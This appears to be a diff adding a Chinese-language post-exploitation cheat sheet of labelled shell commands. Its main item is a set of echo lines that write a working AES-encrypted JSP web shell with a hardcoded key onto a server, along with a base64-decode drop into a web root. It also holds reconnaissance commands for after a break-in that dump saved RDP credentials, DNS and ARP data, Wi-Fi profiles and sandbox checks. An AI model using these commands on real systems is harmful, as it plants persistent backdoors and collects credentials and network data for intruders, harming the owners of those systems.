@@ -1,0 +1,21 @@
+windows查找文件::::dir c:\ /s /b | find "win.ini"、dir c:\ /s /b | find "navicat.exe"、dir c:\ /s /b | find "finalshell.exe"
+
+linux查找文件::::find / -name passwd
+
+windows写文件::::echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^> >> C:/x/x.jsp、、echo ^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^> >> C:/x/x.jsp、、echo ^<%if (request.getMethod().equals("POST")){String k="af8a6a25cc5bfb73";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> >> C:/x/x.jsp
+
+linux写文件::::echo xxxxx== |base64 -d > /var/www/html/1.jsp
+
+获取操作系统命令::::wmic OS get Caption,CSDVersion,OSArchitecture,Version
+
+主机收集::::查看rdp链接记录 cmdkey /list、查看dns记录 ipconfig /displaydns 、查看arp记录 arp -a
+
+根据进程查找进程文件::::wmic process where name="xxxx.exe" get processid,executablepath,name、wmic process where name="chrome.exe" list full
+
+查看当前系统是否有屏保保护，延迟是多少::::wmic desktop get screensaversecure,screensavertimeout
+
+查看当前系统是否是VMWARE::::wmic bios list full | find /i "vmware"
+
+显示系统中的曾经连接过的无线密码::::netsh wlan show profiles
+
+windows常用的系统变量::::查看当前用户目录%HOMEPATH、查看当前目录%CD%、列出用户共享主目录的网络路径%HOMESHARE%、 列出有效的当前登录会话的域名控制器名、列出了可执行文件的搜索路径%Path%、列出了处理器的芯片架构%PROCESSOR_ARCHITECTURE%、列出了Program Files文件夹的路径%ProgramFiles%、列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%、列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP%、列出了包含用户帐号的域的名字%USERDOMAIN%、列出操作系统目录的位置%WINDIR%、返回“所有用户”配置文件的位置%ALLUSERSPROFILE%、返回处理器数目%NUMBER_OF_PROCESSORS%
